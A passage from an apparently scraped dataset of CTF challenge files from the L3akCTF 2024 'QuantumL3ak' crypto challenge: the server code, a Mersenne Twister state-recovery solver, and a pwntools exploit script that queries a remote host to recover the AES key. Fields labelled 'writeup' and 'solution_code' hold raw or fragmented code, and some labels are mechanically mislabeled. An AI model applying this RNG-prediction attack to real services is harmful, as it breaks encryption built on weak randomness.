StatevectorSimulator):\n    circuit = QuantumCircuit(8)\n    noise = noise_circuit.copy()\n    circuit = circuit.compose(noise)\n    if uploaded_circuit is not None:\n        circuit = circuit.compose(uploaded_circuit)\n    result = statesim.run(circuit).result()\n    statevector : Statevector = result.get_statevector()\n    probs_dict = statevector.probabilities_dict()\n    states = []\n    probs = []\n    state_count = len(probs_dict)\n    for state in sorted(probs_dict.keys()):\n        states.append(state)\n        probs.append(round(probs_dict[state]*state_count))\n    print(rng.choices(states, weights=probs)[0])\n\ndef main():\n    api_requests = 0\n    rng = Random(os.urandom(8))\n\n    setup(rng)\n    while True:\n        if api_requests == API_MAX_REQUEST:\n            break\n        display_menu(api_requests)\n        try:\n            user = input(\"Choice: \")\n            choice = API_CHOICE(int(user))\n        except Exception as e:\n            print(\"Invalid Choice\", e)\n        if choice not in API_MENU:\n            print(\"Invalid Choice\")\n        elif choice == API_CHOICE.Exit:\n            break\n        else:\n            API_MENU[choice].Action()\n            api_requests += 1\n        print(\"\")\n    print_encrypted_flag(rng)\n\nif __name__ == \"__main__\":\n    main()\n", "solution_code": "    print(\"You may:\")\n    for i, (_, api) in enumerate(API_MENU.items(), 1):\n        print(f\"{i}. {api.ShortDesc}\")\n    print(f\"You have made {api_requests}/{API_MAX_REQUEST} requests\")\n\n\n    key = rng.getrandbits(128).to_bytes(16, byteorder='little')\n    iv  = rng.getrandbits(128).to_bytes(16, byteorder='little')\n    aes = AES.new(key, mode=AES.MODE_CBC, iv=iv)\n    with open(\"./flag.txt\", \"rb\") as flagfile:\n        flag = pad(flagfile.read(), 16)\n    ciphertext : bytes = aes.encrypt(flag)\n    print(\"Flag:\")\n    print(\"ct:\", ciphertext.hex())\n    print(\"iv:\", iv.hex())\n\n\n    if uploaded_circuit is not None:\n        print(uploaded_circuit.draw())\n    else:\n        print(\"No circuit has been uploaded\")\n\n\n    global uploaded_circuit\n    try:\n        result = json.loads(input(\"Enter circuit json:\"))\n    except Exception:\n        print(\"invalid json\")\n        return\n\n\n    circuit = QuantumCircuit(8)\n    try:\n        for gate in result[\"gates\"]:\n            parse = gate.split(\" \")\n            if parse[0] == \"H\":\n                which = int(parse[1])\n                circuit.h(which)\n            elif parse[0] == \"CX\":\n                controller, controlled = int(parse[1]), int(parse[2])\n                circuit.cx(controller, controlled)\n    except Exception as e:\n        print(\"Input is invalid.\")\n        print(\"Expected input is of the form:\")\n        print('{\"gates\": [\"H 0\", \"CX 0 1\", \"H 3\"]}')\n        return\n    print(\"Circuit has been uploaded\")\n    print(circuit.draw())\n    uploaded_circuit = circuit\n\n\n    circuit = QuantumCircuit(8)\n    noise = noise_circuit.copy()\n    circuit = circuit.compose(noise)\n    if uploaded_circuit is not None:\n        circuit = circuit.compose(uploaded_circuit)\n    result = statesim.run(circuit).result()\n    statevector : Statevector = result.get_statevector()\n    probs_dict = statevector.probabilities_dict()\n    states = []\n    probs = []\n    state_count = len(probs_dict)\n    for state in sorted(probs_dict.keys()):\n        states.append(state)\n        probs.append(round(probs_dict[state]*state_count))\n    print(rng.choices(states, weights=probs)[0])\n\n\n    setup(rng)\n    while True:\n        if api_requests == API_MAX_REQUEST:\n            break\n        display_menu(api_requests)\n        try:\n            user = input(\"Choice: \")\n            choice = API_CHOICE(int(user))\n        except Exception as e:\n            print(\"Invalid Choice\", e)\n        if choice not in API_MENU:\n            print(\"Invalid Choice\")\n        elif choice == API_CHOICE.Exit:\n            break\n        else:\n            API_MENU[choice].Action()\n            api_requests += 1\n        print(\"\")\n    print_encrypted_flag(rng)\n", "tools": ["pycryptodome"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\QuantumL3ak\\build\\quantum.py", "file_size": 4709, "scraped_at": "2025-10-26T18:20:14.154148"}
{"id": "l3ak-team_L3akCTF-2024-public_quantum", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "quantum", "attack_type": "AES", "writeup": "import os\nimport random\nimport json\n\nfrom collections import namedtuple\nfrom typing import Dict\nfrom qiskit import QuantumCircuit\nfrom qiskit_aer import StatevectorSimulator\nfrom qiskit_aer.backends.compatibility import Statevector\nfrom random import Random\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\nfrom enum import Enum\n\nAPI_CHOICE = Enum(\"API_CHOICE\", [\"UploadCircuit\", \"DisplayCircuit\", \"PerformMeasurement\", \"Exit\"])\nAPI = namedtuple(\"API\", [\"ShortDesc\", \"Action\"])\nAPI_MAX_REQUEST = 3200\nAPI_MENU : Dict[str, API] = {}\n\ndef build_api_menu(rng, statesim : StatevectorSimulator):\n    global API_MENU\n    API_MENU = {\n        API_CHOICE.UploadCircuit: API(\n            ShortDesc=\"Upload a circuit\",\n            Action=upload_circuit\n        ),\n        API_CHOICE.DisplayCircuit: API(\n            ShortDesc=\"Display the uploaded circuit\",\n            Action=display_circuit\n        ),\n        API_CHOICE.PerformMeasurement: API(\n            ShortDesc=\"Perform a measurement\",\n            Action=lambda: perform_measurement(rng, statesim)\n        ),\n        API_CHOICE.Exit: API(\n            ShortDesc=\"Exit\",\n            Action=None\n        )\n    }\n\nnoise_circuit : QuantumCircuit = None\nuploaded_circuit : QuantumCircuit = None\noutcomes = []\n\ndef generate_noise():\n    circuit = QuantumCircuit(8)\n    controls = random.sample(range(8), k = 4)\n    dependents = set(range(8)) - set(controls)\n    for c in controls:\n        circuit.h(c)\n        coupled = random.sample(list(dependents), k=1)\n        dependents -= set(coupled)\n        for cx in coupled:\n            circuit.cx(c, cx)\n    return circuit\n\ndef setup(rng):\n    global noise_circuit\n    noise_circuit = generate_noise()\n    build_api_menu(rng, StatevectorSimulator())\n\ndef display_menu(api_requests):\n    print(\"You may:\")\n    for i, (_, api) in enumerate(API_MENU.items(), 1):\n        print(f\"{i}. {api.ShortDesc}\")\n    print(f\"You have made {api_requests}/{API_MAX_REQUEST} requests\")\n\ndef print_encrypted_flag(rng : Random):\n    key = rng.getrandbits(128).to_bytes(16, byteorder='little')\n    iv  = rng.getrandbits(128).to_bytes(16, byteorder='little')\n    aes = AES.new(key, mode=AES.MODE_CBC, iv=iv)\n    with open(\"./flag.txt\", \"rb\") as flagfile:\n        flag = pad(flagfile.read(), 16)\n    ciphertext : bytes = aes.encrypt(flag)\n    print(\"Flag:\")\n    print(\"ct:\", ciphertext.hex())\n    print(\"iv:\", iv.hex())\n\ndef display_circuit():\n    if uploaded_circuit is not None:\n        print(uploaded_circuit.draw())\n    else:\n        print(\"No circuit has been uploaded\")\n\ndef upload_circuit():\n    global uploaded_circuit\n    try:\n        result = json.loads(input(\"Enter circuit json:\"))\n    except Exception:\n        print(\"invalid json\")\n        return\n\n    circuit = QuantumCircuit(8)\n    try:\n        for gate in result[\"gates\"]:\n            parse = gate.split(\" \")\n            if parse[0] == \"H\":\n                which = int(parse[1])\n                circuit.h(which)\n            elif parse[0] == \"CX\":\n                controller, controlled = int(parse[1]), int(parse[2])\n                circuit.cx(controller, controlled)\n    except Exception as e:\n        print(\"Input is invalid.\")\n        print(\"Expected input is of the form:\")\n        print('{\"gates\": [\"H 0\", \"CX 0 1\", \"H 3\"]}')\n        return\n    print(\"Circuit has been uploaded\")\n    print(circuit.draw())\n    uploaded_circuit = circuit\n\ndef perform_measurement(rng : Random, statesim : StatevectorSimulator):\n    circuit = QuantumCircuit(8)\n    noise = noise_circuit.copy()\n    circuit = circuit.compose(noise)\n    if uploaded_circuit is not None:\n        circuit = circuit.compose(uploaded_circuit)\n    result = statesim.run(circuit).result()\n    statevector : Statevector = result.get_statevector()\n    probs_dict = statevector.probabilities_dict()\n    states = []\n    probs = []\n    state_count = len(probs_dict)\n    for state in sorted(probs_dict.keys()):\n        states.append(state)\n        probs.append(round(probs_dict[state]*state_count))\n    print(rng.choices(states, weights=probs)[0])\n\ndef main():\n    api_requests = 0\n    rng = Random(os.urandom(8))\n\n    setup(rng)\n    while True:\n        if api_requests == API_MAX_REQUEST:\n            break\n        display_menu(api_requests)\n        try:\n            user = input(\"Choice: \")\n            choice = API_CHOICE(int(user))\n        except Exception as e:\n            print(\"Invalid Choice\", e)\n        if choice not in API_MENU:\n            print(\"Invalid Choice\")\n        elif choice == API_CHOICE.Exit:\n            break\n        else:\n            API_MENU[choice].Action()\n            api_requests += 1\n        print(\"\")\n    print_encrypted_flag(rng)\n\nif __name__ == \"__main__\":\n    main()\n", "solution_code": "    print(\"You may:\")\n    for i, (_, api) in enumerate(API_MENU.items(), 1):\n        print(f\"{i}. {api.ShortDesc}\")\n    print(f\"You have made {api_requests}/{API_MAX_REQUEST} requests\")\n\n\n    key = rng.getrandbits(128).to_bytes(16, byteorder='little')\n    iv  = rng.getrandbits(128).to_bytes(16, byteorder='little')\n    aes = AES.new(key, mode=AES.MODE_CBC, iv=iv)\n    with open(\"./flag.txt\", \"rb\") as flagfile:\n        flag = pad(flagfile.read(), 16)\n    ciphertext : bytes = aes.encrypt(flag)\n    print(\"Flag:\")\n    print(\"ct:\", ciphertext.hex())\n    print(\"iv:\", iv.hex())\n\n\n    if uploaded_circuit is not None:\n        print(uploaded_circuit.draw())\n    else:\n        print(\"No circuit has been uploaded\")\n\n\n    global uploaded_circuit\n    try:\n        result = json.loads(input(\"Enter circuit json:\"))\n    except Exception:\n        print(\"invalid json\")\n        return\n\n\n    circuit = QuantumCircuit(8)\n    try:\n        for gate in result[\"gates\"]:\n            parse = gate.split(\" \")\n            if parse[0] == \"H\":\n                which = int(parse[1])\n                circuit.h(which)\n            elif parse[0] == \"CX\":\n                controller, controlled = int(parse[1]), int(parse[2])\n                circuit.cx(controller, controlled)\n    except Exception as e:\n        print(\"Input is invalid.\")\n        print(\"Expected input is of the form:\")\n        print('{\"gates\": [\"H 0\", \"CX 0 1\", \"H 3\"]}')\n        return\n    print(\"Circuit has been uploaded\")\n    print(circuit.draw())\n    uploaded_circuit = circuit\n\n\n    circuit = QuantumCircuit(8)\n    noise = noise_circuit.copy()\n    circuit = circuit.compose(noise)\n    if uploaded_circuit is not None:\n        circuit = circuit.compose(uploaded_circuit)\n    result = statesim.run(circuit).result()\n    statevector : Statevector = result.get_statevector()\n    probs_dict = statevector.probabilities_dict()\n    states = []\n    probs = []\n    state_count = len(probs_dict)\n    for state in sorted(probs_dict.keys()):\n        states.append(state)\n        probs.append(round(probs_dict[state]*state_count))\n    print(rng.choices(states, weights=probs)[0])\n\n\n    setup(rng)\n    while True:\n        if api_requests == API_MAX_REQUEST:\n            break\n        display_menu(api_requests)\n        try:\n            user = input(\"Choice: \")\n            choice = API_CHOICE(int(user))\n        except Exception as e:\n            print(\"Invalid Choice\", e)\n        if choice not in API_MENU:\n            print(\"Invalid Choice\")\n        elif choice == API_CHOICE.Exit:\n            break\n        else:\n            API_MENU[choice].Action()\n            api_requests += 1\n        print(\"\")\n    print_encrypted_flag(rng)\n", "tools": ["pycryptodome"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\QuantumL3ak\\dist\\quantum.py", "file_size": 4709, "scraped_at": "2025-10-26T18:20:14.158487"}
{"id": "l3ak-team_L3akCTF-2024-public_This_is_just_multiplication", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "This is just multiplication", "attack_type": "XOR", "writeup": "import numpy\nimport time\nimport tqdm\n#import numba\n#from numba import uint64\n#from numba.experimental import jitclass\n\nmatrices = {}\ndef matrix(n):\n    if n in matrices:\n        return matrices[n]\n    M = numpy.array([[(n>>i) & 1 for i in range(32)]], dtype=numpy.uint32)\n    matrices[n] = M\n    return M\n\nxormatices = {}\ndef xormatrix(n):\n    xor = []\n    for i in range(32):\n        if (n >> i) & 1:\n            xormatrix.append([1]*624)\n        else:\n            xormatrix.append([0]*624)\n    xormatrix = numpy.array(xormatrix)\n    xormatrices[n] = xormatrix\n    return xormatrix\n\ndef show_non_zero(array):\n    for i, e in enumerate(array):\n        if e != 0:\n            print((i,e))\n\n#spec = [('mat', uint64)]\n\nclass FastSymMersenne:\n    def __init__(self, shape=None, matrix=None):\n        if matrix is not None:\n            self.mat = matrix\n            return\n        raise Exception(\"Specify either shape or matrix\")\n\n    def __xor__(self, other):\n        if isinstance(other, int):\n            other = xormatrix(other)\n        else:\n            other = other.mat\n        return FastSymMersenne(matrix=self.mat ^ other)\n\n    __rxor__ = __xor__\n\n    def __mul__(self, other):\n        assert isinstance(other, int) and other >= 0\n        assert (self.mat[1:] == 0).all()\n        C = self.mat.copy()\n        M = matrix(other)\n        for i in range(32):\n            C[i,:] = C[0,:] * M[0,i]\n        return FastSymMersenne(matrix=C)\n\n    def __rmul__(self, other):\n      return self * other\n\n    def __rshift__(self, other : int):\n        assert isinstance(other, int)\n        assert self.mat.shape[0] >= other\n        C = self.mat.copy()\n        k = other\n        C[:k,:] = 0\n        C = numpy.roll(C, -k, axis=0)\n        return FastSymMersenne(matrix=C)\n\n    def __lshift__(self, other : int):\n        assert isinstance(other, int)\n        assert self.mat.shape[0] >= other\n        C = self.mat.copy()\n        k = other\n        C[-k:,:] = 0\n        C = numpy.roll(C, k, axis=0)\n        return FastSymMersenne(matrix=C)\n\n    def __and__(self, other):\n        assert isinstance(other, int)\n        # This is just multiplication\n        M = matrix(other)\n        return FastSymMersenne(matrix=M.transpose()*self.mat)\n\n    #def __repr__(self):\n    #    return repr(self.mat)\n\nclass MT19937:\n    W = 32\n    N = 624\n    M = 397\n    R = 31\n    A = 0x9908B0DF\n    U = 11\n    D = 0xFFFFFFFF\n    S = 7\n    B = 0x9D2C5680\n    T = 15\n    C = 0xEFC60000\n    L = 18\n\n    F = 1812433253\n\n    def __init__(self):\n        self.state = []\n        for i in range(624):\n            mat = numpy.zeros(shape=(32,624),dtype=numpy.uint32) # 32 rows for each bit, 624 contributors\n            for j in range(32):\n                mat[j,i] = 2**j # the initial jth bit \n            self.state.append(FastSymMersenne(matrix=mat))\n        self.idx = self.N\n\n    def rand(self):\n        if self.idx >= self.N:\n            self._twist()\n        y = self.state[self.idx]\n        assert not ((y.mat == 0).all())\n        y ^= (y >> self.U) & self.D\n        y ^= (y << self.S) & self.B\n        y ^= (y << self.T) & self.C\n        y ^= y >> self.L\n        self.idx += 1\n        return y\n\n    def getrandbits(self, n):\n        assert n <= 32\n        n = int(n)\n        return self.rand() >> (32 - n)\n\n    def _twist(self):\n        lower_mask = (1 << self.R) - 1\n        upper_mask = 2**self.W - 1 - lower_mask\n        for i in range(0, self.N):\n            x = (self.state[i] & upper_mask) ^ (self.state[(i + 1) % self.N] & lower_mask)\n            xA = x >> 1\n            xA ^= (x & 1) * self.A\n            self.state[i] = self.state[(i + self.M) % self.N] ^ xA\n        self.idx = 0\n\nclass MT19937Solver:\n    def __init__(self):\n        self.model = MT19937()\n        self.observed = []\n\n    def submit(self, bits, value):\n        bit_expressions = self.model.getrandbits(bits).mat[:bits]\n\n        # cannot extend observed\n        # this call will have simply advanced the state\n        if value is None:\n            return bit_expressions\n\n        for i, expr in zip(range(bits), bit_expressions):\n            if value[i] is not None:\n                expr = numpy.unpackbits(expr.view(numpy.uint8), bitorder='little')\n                self.observed.append((expr, value[i]))\n        return bit_expressions\n        \n    def v2n(self, vec):\n        acc = 0\n        for i, v in enumerate(vec):\n            acc += 2**i * int(v)\n        return acc\n\n    def solve(self):\n        size = self.model.N * self.model.W\n        flatten = []\n        observed = []\n        for expr, value in self.observed:\n            flatten.append(expr)\n            observed.append(value)\n        M = numpy.array(flatten)\n        print(\"\\nShape:\",M.shape,\"\\n\")\n        observed = numpy.array(observed)\n        observed = observed.reshape((len(observed), 1))\n        print(\"\\nShape:\",observed.shape,\"\\n\")\n        solution = gaussian_eliminate(M, observed)\n        res = []\n        for i in range(624):\n            res.append(self.v2n(solution[32*i:32*(i+1)]))\n", "solution_code": "    for i, e in enumerate(array):\n        if e != 0:\n            print((i,e))\n\n\n    def __init__(self, shape=None, matrix=None):\n        if matrix is not None:\n            self.mat = matrix\n            return\n        raise Exception(\"Specify either shape or matrix\")\n\n\n    def __xor__(self, other):\n        if isinstance(other, int):\n            other = xormatrix(other)\n        else:\n            other = other.mat\n        return FastSymMersenne(matrix=self.mat ^ other)\n\n\n    def __mul__(self, other):\n        assert isinstance(other, int) and other >= 0\n        assert (self.mat[1:] == 0).all()\n        C = self.mat.copy()\n        M = matrix(other)\n        for i in range(32):\n            C[i,:] = C[0,:] * M[0,i]\n        return FastSymMersenne(matrix=C)\n\n\n    def __rmul__(self, other):\n      return self * other\n\n\n    def __rshift__(self, other : int):\n        assert isinstance(other, int)\n        assert self.mat.shape[0] >= other\n        C = self.mat.copy()\n        k = other\n        C[:k,:] = 0\n        C = numpy.roll(C, -k, axis=0)\n        return FastSymMersenne(matrix=C)\n\n\n    def __lshift__(self, other : int):\n        assert isinstance(other, int)\n        assert self.mat.shape[0] >= other\n        C = self.mat.copy()\n        k = other\n        C[-k:,:] = 0\n        C = numpy.roll(C, k, axis=0)\n        return FastSymMersenne(matrix=C)\n\n\n    def __and__(self, other):\n        assert isinstance(other, int)\n        # This is just multiplication\n        M = matrix(other)\n        return FastSymMersenne(matrix=M.transpose()*self.mat)\n\n\n    #def __repr__(self):\n    #    return repr(self.mat)\n\n\n    def __init__(self):\n        self.state = []\n        for i in range(624):\n            mat = numpy.zeros(shape=(32,624),dtype=numpy.uint32) # 32 rows for each bit, 624 contributors\n            for j in range(32):\n                mat[j,i] = 2**j # the initial jth bit \n            self.state.append(FastSymMersenne(matrix=mat))\n        self.idx = self.N\n\n\n    def rand(self):\n        if self.idx >= self.N:\n            self._twist()\n        y = self.state[self.idx]\n        assert not ((y.mat == 0).all())\n        y ^= (y >> self.U) & self.D\n        y ^= (y << self.S) & self.B\n        y ^= (y << self.T) & self.C\n        y ^= y >> self.L\n        self.idx += 1\n        return y\n\n\n    def getrandbits(self, n):\n        assert n <= 32\n        n = int(n)\n        return self.rand() >> (32 - n)\n\n\n    def _twist(self):\n        lower_mask = (1 << self.R) - 1\n        upper_mask = 2**self.W - 1 - lower_mask\n        for i in range(0, self.N):\n            x = (self.state[i] & upper_mask) ^ (self.state[(i + 1) % self.N] & lower_mask)\n            xA = x >> 1\n            xA ^= (x & 1) * self.A\n            self.state[i] = self.state[(i + self.M) % self.N] ^ xA\n        self.idx = 0\n\n\n    def __init__(self):\n        self.model = MT19937()\n        self.observed = []\n\n\n    def submit(self, bits, value):\n        bit_expressions = self.model.getrandbits(bits).mat[:bits]\n\n\n        for i, expr in zip(range(bits), bit_expressions):\n            if value[i] is not None:\n                expr = numpy.unpackbits(expr.view(numpy.uint8), bitorder='little')\n                self.observed.append((expr, value[i]))\n        return bit_expressions\n        \n    def v2n(self, vec):\n        acc = 0\n        for i, v in enumerate(vec):\n            acc += 2**i * int(v)\n        return acc\n\n\n    def solve(self):\n        size = self.model.N * self.model.W\n        flatten = []\n        observed = []\n        for expr, value in self.observed:\n            flatten.append(expr)\n            observed.append(value)\n        M = numpy.array(flatten)\n        print(\"\\nShape:\",M.shape,\"\\n\")\n        observed = numpy.array(observed)\n        observed = observed.reshape((len(observed), 1))\n        print(\"\\nShape:\",observed.shape,\"\\n\")\n        solution = gaussian_eliminate(M, observed)\n        res = []\n        for i in range(624):\n            res.append(self.v2n(solution[32*i:32*(i+1)]))\n        return res\n\n\n    MT = MT19937()\n    print(\"inited!\")\n    for i in range(624*32*2):\n        res = MT.rand()\n    print(\"done\")\n    print(MT.state[0].mat[0,:])\n\n\n    import random\n    mrand = MT19937Solver()\n    rand = random.Random(int(1))\n    initial_state = rand.__getstate__()[1][:-1]\n    for i in tqdm.tqdm(range(624*32)):\n        b = (rand.getrandbits(32) >> 31) & 1\n        _ = (rand.getrandbits(32) >> 31) & 1\n        mrand.submit(32, [None]*31+[b])\n        mrand.submit(32, None)\n    result = mrand.solve()\n    for i in range(len(initial_state)):\n        print(initial_state[i], result[i])\n", "tools": [], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\QuantumL3ak\\solution\\fastmt.py", "file_size": 5667, "scraped_at": "2025-10-26T18:20:14.175593"}
{"id": "l3ak-team_L3akCTF-2024-public_This_file_was_*autogenerated*_from_the_file_fastmt_solver.sage", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "This file was *autogenerated* from the file fastmt_solver.sage", "attack_type": "Unknown", "writeup": "\n\n# This file was *autogenerated* from the file fastmt_solver.sage\nfrom sage.all_cmdline import *   # import sage library\n\n_sage_const_0 = Integer(0); _sage_const_2 = Integer(2); _sage_const_624 = Integer(624); _sage_const_32 = Integer(32); _sage_const_1 = Integer(1); _sage_const_31 = Integer(31); _sage_const_16 = Integer(16); _sage_const_3 = Integer(3); _sage_const_30 = Integer(30)\nimport tqdm\nimport time\n\nfrom fastmt import MT19937\nimport numpy\n\nload(\"fill_matrix.spyx\")\n\nclass MT19937Solver:\n    def __init__(self):\n        self.model = MT19937()\n        self.observed = []\n\n    def submit(self, bits, value):\n        bit_expressions = self.model.getrandbits(bits).mat[:bits,:]\n\n        # cannot extend observed\n        # this call will have simply advanced the state\n        if value is None:\n            return\n\n        for i, expr in zip(range(bits), bit_expressions):\n            if value[i] is not None:\n                expr = numpy.unpackbits(expr.view(numpy.uint8), bitorder='little')\n                self.observed.append((expr, value[i]))\n        \n    def v2n(self, vec):\n        acc = _sage_const_0 \n        for i, v in enumerate(vec):\n            acc += _sage_const_2 **i * int(v)\n        return acc\n\n    def solve(self):\n        size = self.model.N * self.model.W\n        rows = []\n        observed_values = []\n        observed = vector(GF(_sage_const_2 ), len(self.observed))\n        print(\"Constructing rows and observed values\")\n        shape = (int(len(observed)),int(_sage_const_624 *_sage_const_32 ))\n        rows = numpy.zeros(shape=shape, dtype=numpy.uint32)\n        for i,(row, value) in tqdm.tqdm(enumerate(self.observed)):\n            observed[i] = value\n            rows[i] = row\n        # Create Matrix\n        start = time.time()\n        M = Matrix(GF(_sage_const_2 ), len(self.observed), size)\n        print(\"Filling Matrix...\")\n        #for i,(row, value) in tqdm.tqdm(enumerate(self.observed)):\n        #    #for j in range(len(row)):\n        #    #    M[i,j] = row[j]\n        #    M.set_row(i,row)\n        #    #fill_matrix_row(M, i, len(row), row)\n        #    eqns.append(row)\n        #    #observed[i] = value\n        fill_matrix(M, rows)\n        print(\"Filled Matrix:\", time.time() - start)\n        print(\"Solving Matrix for observed vector\")\n        self.M = M\n        start = time.time()\n        solution = M  * BackslashOperator() * observed\n        print(\"Computed solution:\", time.time() - start)\n        print(\"Converting to numbers...\")\n        res = []\n        for i in range(_sage_const_624 ):\n            res.append(self.v2n(solution[_sage_const_32 *i:_sage_const_32 *(i+_sage_const_1 )]))\n        return res\n\ndef test2():\n    import random\n    mrand = MT19937Solver()\n    rand = random.Random(int(_sage_const_1 ))\n    initial_state = rand.__getstate__()[_sage_const_1 ][:-_sage_const_1 ]\n    #b = rand.choices([0,1,2,3], weights=[1,1,1,1])[0]\n    b = rand.getrandbits(_sage_const_32 )\n    mrand.submit(_sage_const_32 ,[None]*_sage_const_31  + [b>>_sage_const_31 ])\n    for i in tqdm.tqdm(range(_sage_const_624 *_sage_const_16 )):\n        #b = (rand.getrandbits(32) >> 30) & 3\n        #b1 = b >> 1\n        #b2 = b & 1\n        #_ = (rand.getrandbits(32) >> 30) & 3\n        b = rand.choices([_sage_const_0 ,_sage_const_1 ,_sage_const_2 ,_sage_const_3 ], weights=[_sage_const_1 ,_sage_const_1 ,_sage_const_1 ,_sage_const_1 ])[_sage_const_0 ]\n        #mrand.submit(32, [None]*30+[b2, b1])\n        mrand.submit(_sage_const_32 , [None]*_sage_const_30  + [b&_sage_const_1 ,b>>_sage_const_1 ])\n        mrand.submit(_sage_const_32 , None)\n    result = mrand.solve()\n    for i in range(len(initial_state)):\n        print(initial_state[i], result[i])\n\nif __name__ == \"__main__\":\n    test2()\n\n", "solution_code": "    def __init__(self):\n        self.model = MT19937()\n        self.observed = []\n\n\n    def submit(self, bits, value):\n        bit_expressions = self.model.getrandbits(bits).mat[:bits,:]\n\n\n        for i, expr in zip(range(bits), bit_expressions):\n            if value[i] is not None:\n                expr = numpy.unpackbits(expr.view(numpy.uint8), bitorder='little')\n                self.observed.append((expr, value[i]))\n        \n    def v2n(self, vec):\n        acc = _sage_const_0 \n        for i, v in enumerate(vec):\n            acc += _sage_const_2 **i * int(v)\n        return acc\n\n\n    def solve(self):\n        size = self.model.N * self.model.W\n        rows = []\n        observed_values = []\n        observed = vector(GF(_sage_const_2 ), len(self.observed))\n        print(\"Constructing rows and observed values\")\n        shape = (int(len(observed)),int(_sage_const_624 *_sage_const_32 ))\n        rows = numpy.zeros(shape=shape, dtype=numpy.uint32)\n        for i,(row, value) in tqdm.tqdm(enumerate(self.observed)):\n            observed[i] = value\n            rows[i] = row\n        # Create Matrix\n        start = time.time()\n        M = Matrix(GF(_sage_const_2 ), len(self.observed), size)\n        print(\"Filling Matrix...\")\n        #for i,(row, value) in tqdm.tqdm(enumerate(self.observed)):\n        #    #for j in range(len(row)):\n        #    #    M[i,j] = row[j]\n        #    M.set_row(i,row)\n        #    #fill_matrix_row(M, i, len(row), row)\n        #    eqns.append(row)\n        #    #observed[i] = value\n        fill_matrix(M, rows)\n        print(\"Filled Matrix:\", time.time() - start)\n        print(\"Solving Matrix for observed vector\")\n        self.M = M\n        start = time.time()\n        solution = M  * BackslashOperator() * observed\n        print(\"Computed solution:\", time.time() - start)\n        print(\"Converting to numbers...\")\n        res = []\n        for i in range(_sage_const_624 ):\n            res.append(self.v2n(solution[_sage_const_32 *i:_sage_const_32 *(i+_sage_const_1 )]))\n        return res\n\n\n    import random\n    mrand = MT19937Solver()\n    rand = random.Random(int(_sage_const_1 ))\n    initial_state = rand.__getstate__()[_sage_const_1 ][:-_sage_const_1 ]\n    #b = rand.choices([0,1,2,3], weights=[1,1,1,1])[0]\n    b = rand.getrandbits(_sage_const_32 )\n    mrand.submit(_sage_const_32 ,[None]*_sage_const_31  + [b>>_sage_const_31 ])\n    for i in tqdm.tqdm(range(_sage_const_624 *_sage_const_16 )):\n        #b = (rand.getrandbits(32) >> 30) & 3\n        #b1 = b >> 1\n        #b2 = b & 1\n        #_ = (rand.getrandbits(32) >> 30) & 3\n        b = rand.choices([_sage_const_0 ,_sage_const_1 ,_sage_const_2 ,_sage_const_3 ], weights=[_sage_const_1 ,_sage_const_1 ,_sage_const_1 ,_sage_const_1 ])[_sage_const_0 ]\n        #mrand.submit(32, [None]*30+[b2, b1])\n        mrand.submit(_sage_const_32 , [None]*_sage_const_30  + [b&_sage_const_1 ,b>>_sage_const_1 ])\n        mrand.submit(_sage_const_32 , None)\n    result = mrand.solve()\n    for i in range(len(initial_state)):\n        print(initial_state[i], result[i])\n", "tools": ["sage"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\QuantumL3ak\\solution\\fastmt_solver_sage.py", "file_size": 3731, "scraped_at": "2025-10-26T18:20:14.197050"}
{"id": "l3ak-team_L3akCTF-2024-public_make_our_lives_easier_by_ordering_this", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "make our lives easier by ordering this", "attack_type": "AES", "writeup": "import argparse\n\nimport os\nimport json\nimport random\n\nfrom Crypto.Cipher import AES\n\nimport pwn\nimport tqdm\n#from fastmt import MT19937Solver\nfrom fastmt_solver_sage import MT19937Solver\n\ndef find_pairs(results):\n    pairs = []\n    for i in range(8):\n        possibilities = set(range(8)) - set([i])\n        for result in results:\n            ps = list(possibilities)\n            for p in ps:\n                if result[i] != result[p]:\n                    possibilities.remove(p)\n                if len(possibilities) == 1:\n                    break\n        if len(possibilities) != 1:\n            raise Exception(\"Could not find partner for i\")\n        j = possibilities.pop()\n        # make our lives easier by ordering this\n        i, j = 7-i, 7-j # first bit is highest bit\n        if i < j:\n            pairs.append((i,j))\n    return pairs\n\ndef construct_inverse(results):\n    gates = []\n    pairs = find_pairs(results)\n    for pair in pairs:\n        cx = f\"CX {pair[0]} {pair[1]}\"\n        hadamard = f\"H {pair[0]}\"\n        gates.append(cx)\n        gates.append(hadamard)\n\n    # maximize entropy\n    for i in range(8):\n        gates.append(f\"H {i}\")\n    return json.dumps({\"gates\": gates})\n\ndef process_result(result):\n    bits = []\n    bits = [None] * 24 # don't know these\n    for bit in reversed(result):\n        bit = bit - 0x30\n        bits.append(bit)\n    return bits\n        \ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"host\",\n        help=\"target host name\")\n    parser.add_argument(\"port\",\n        help=\"target port\")\n    options = parser.parse_args()\n\n    r = pwn.remote(options.host, options.port)\n\n    solver = MT19937Solver()\n    #r = pwn.process([\"python3\",\"quantum.py\"])\n    #print(r.recv())\n    r.recvuntil(b\"Choice: \")\n\n    # Measure Noise\n\n    # perform measurements in bulk\n    r.send(b\"3\\n\"*(32))\n\n    results = []\n    for i in range(32):\n        res = r.recvline()\n        results.append(res[:-1])\n        r.recvuntil(b\"Choice: \")\n        solver.submit(32, None) # We're just going to ignore these.\n        solver.submit(32, None)\n    remaining = (624*32)//8 + 624\n    solution_circuit_json = construct_inverse(results)\n    r.sendline(b\"1\")\n    r.sendline(solution_circuit_json.encode())\n    r.recvuntil(\"Choice: \")\n    \n    r.send(b\"3\\n\"*(remaining))\n\n    # for i in tqdm.tqdm(range(remaining)):\n    for i in tqdm.tqdm(range(remaining)):\n        result = r.recvline()[:-1]\n        r.recvuntil(b\"Choice: \")\n        bits = process_result(result)\n        solver.submit(32, bits)\n        solver.submit(32, None)\n    r.sendline(b\"4\") # exit\n    \n    r.recvuntil(b\"ct: \")\n    ct = r.recvline()[:-1]\n    r.recvuntil(\"iv: \")\n    iv = r.recvline()[:-1]\n    r.close()\n    print(\"ct\", ct)\n    print(\"iv\", iv)\n    print(\"solver observed:\", len(solver.observed))\n    